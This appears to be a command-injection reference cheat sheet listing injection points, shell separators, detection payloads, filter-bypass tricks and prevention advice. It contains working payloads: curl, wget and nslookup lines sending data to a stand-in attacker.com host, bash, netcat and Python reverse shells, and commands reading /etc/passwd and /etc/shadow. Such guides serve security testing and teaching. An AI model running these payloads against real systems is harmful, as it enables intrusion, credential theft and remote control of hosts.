# Command Injection Reference Guide

## Overview

Command Injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers, etc.) to a system shell.

## Types of Command Injection

### 1. In-band (Classic)
- Results are visible in application response
- Direct output of executed command

### 2. Blind
- No direct output visible
- Detected through time delays or out-of-band techniques

### 3. Out-of-band (OOB)
- Results sent to attacker-controlled server
- Uses DNS or HTTP callbacks

## Common Injection Points

### URL Parameters
```
http://target.com/page.cgi?name=value[COMMAND]
```

### Form Fields
```html
<input name="host" value="[COMMAND]">
```

### HTTP Headers
```
User-Agent: [COMMAND]
X-Forwarded-For: [COMMAND]
```

### Cookies
```
Cookie: session=[COMMAND]
```

## Command Separators

### Unix/Linux
```bash
;           # Semicolon - execute sequentially
&&          # AND - execute if previous succeeds
||          # OR - execute if previous fails
|           # Pipe - output to next command
&           # Background execution
`command`   # Command substitution
$(command)  # Command substitution
```

### Windows
```cmd
&           # Command separator
&&          # AND
||          # OR
|           # Pipe
%0a         # Newline (URL encoded)
%0d         # Carriage return
```

## Common Payloads

### Basic Detection
```bash
; id
; whoami
; uname -a
; pwd
; ls -la
```

### Blind Detection (Time-based)
```bash
; sleep 5
; ping -c 5 127.0.0.1
; timeout 5
; waitfor delay '00:00:05'  # Windows
```

### Data Exfiltration
```bash
; curl http://attacker.com/$(id)
; wget http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com
```

### Reverse Shell
```bash
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; nc -e /bin/sh attacker.com 4444
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Filter Bypass Techniques

### Space Bypass
```bash
$IFS
${IFS}
$IFS$9
%20
%09
<          # Input redirection
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd';$X
```

### Command Substitution
```bash
`cat/etc/passwd`
$(cat</etc/passwd)
{cat,/etc/passwd}
cat${IFS}/etc/passwd
```

### Character Encoding
```bash
# Hex encoding
cat$IFS\x2fetc\x2fpasswd

# Octal encoding
$(printf '\154\163')  # ls
```

### Alternative Commands
```bash
# Instead of cat
cat /etc/passwd
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
nl /etc/passwd
od /etc/passwd
xxd /etc/passwd
hexdump /etc/passwd
```

### Bypass Blacklists
```bash
# If 'cat' is blocked
c\at /etc/passwd
'cat' /etc/passwd
"cat" /etc/passwd
ca''t /etc/passwd
ca\t /etc/passwd
```

## OS-Specific Techniques

### Linux/Unix
```bash
# Read files
cat /etc/passwd
cat /etc/shadow
cat /proc/self/environ
cat /proc/self/cmdline
cat /proc/self/status

# Network
curl http://target
wget http://target
nc -zv target port
ss -tuln
netstat -tuln

# System info
uname -a
id
whoami
groups
env
printenv
```

### Windows
```cmd
# Read files
type C:\Windows\win.ini
type C:\Windows\System32\drivers\etc\hosts

# Network
ipconfig /all
netstat -an
nslookup target.com
ping -n 1 target.com

# System info
whoami
whoami /groups
whoami /priv
systeminfo
ver
```

## Detection Methods

### Error-Based
- Look for shell error messages
- Command not found errors
- Syntax errors

### Time-Based
- Use `sleep` or `ping` commands
- Measure response time differences

### Output-Based
- Look for command output in response
- Check for file contents
- Verify system information

## Tools

- Commix: Automated command injection tool
- CMDi: Command injection scanner
- Burp Suite: Manual testing
- Commix: https://github.com/commixproject/commix

## Prevention

### 1. Input Validation
- Whitelist allowed characters
- Validate input format
- Reject suspicious patterns

### 2. Avoid Shell Execution
```python
# Bad
os.system("ping " + user_input)

# Better
subprocess.run(["ping", "-c", "4", user_input])
```

### 3. Use Safe APIs
```python
# Python
subprocess.run(["command", "arg1", "arg2"], shell=False)

# PHP
escapeshellarg($input)
escapeshellcmd($input)
```

### 4. Least Privilege
- Run application with minimal permissions
- Use sandboxed environments
- Implement proper access controls

## References

- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- PortSwigger Command Injection: https://portswigger.net/web-security/os-command-injection
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
